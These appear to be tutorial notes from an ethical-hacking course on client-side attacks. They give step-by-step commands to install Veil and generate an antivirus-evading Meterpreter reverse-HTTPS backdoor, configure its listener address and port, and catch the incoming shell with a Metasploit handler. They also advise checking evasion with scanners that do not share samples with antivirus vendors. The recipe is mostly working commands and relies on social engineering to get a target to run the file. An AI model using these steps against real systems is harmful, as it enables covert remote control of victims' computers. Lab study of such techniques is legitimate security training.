# Gaining access â€” client side attack
-   used if server side attacks are not possible
-   requires user interaction
-   social engineering and information gathering is really helpful here

## Generate payload (in this case backdoor) with Veil framework
-   hard to create not traceble by antivirus program
-   install Veil on Kali with file `install-veil` in folder attachments or use these commands:
```bash
apt update
apt install -y veil
/usr/share/veil/config/setup.sh --force --silent
```
```bash
veil # start veil
```
-   it is important to keep veil up to date, so use the update often
-   2 main tools in Veil:
    1)  Evasion
        -   generates undetectable backdoors
    2)  Ordnance
        -   generates payloads, which are used by Evasion
        -   part of the "evil" code (reverse connection, downloads and executes file in bg, ...)
```bash
use 1 # uses Evasion tool
list # see all the available payloads
```
-   Meterpreter payloads designed by Metasploit. It runs into memory and it allows to migrate between system processes. For example to run from explorer process. So it is hard to detect.
    -   rev tcp/http/https => reverse connection (target connects to attacker), hard to detect in firewall, looks like user connects to website.

```bash
use 15 # use the payload go/meterpreter/rev_https.py, now configure the required options:
set LHOST 192.168.72.129
set LPORT 8080
set PROCESSORS 1 # not needed, uses only one processor
set SLEEP 6 # not needed, waits 6s before running the code
generate # generates the backdoor, will generate exe file, source code and handlers in displayed location
```
-   check detectability by antivirus programs by no distribute currently down, check alternatives like [kleenscan](https://kleenscan.com/index), <strong>just keep in mind that if virustotal will be used, it will share the results with antivirus programs.</strong>

### Prepare to listen for incomming connection from created payload (backdoor)
-   as mentioned the payload is generated by Metasploit, so use the metasploit to track it:
```bash
msfconsole
use exploit/multi/handler # use module which enables to listen to incomming connections
show options
set PAYLOAD windows/meterpreter/reverse_https # set the payload that was sellected before when generating it (in our case use 15 = go/meterpreter/rev_https.py)
set LHOST 192.168.72.129
set LPORT 8080
exploit # now if anybody opens the backdoor, it will come to this pc...
```
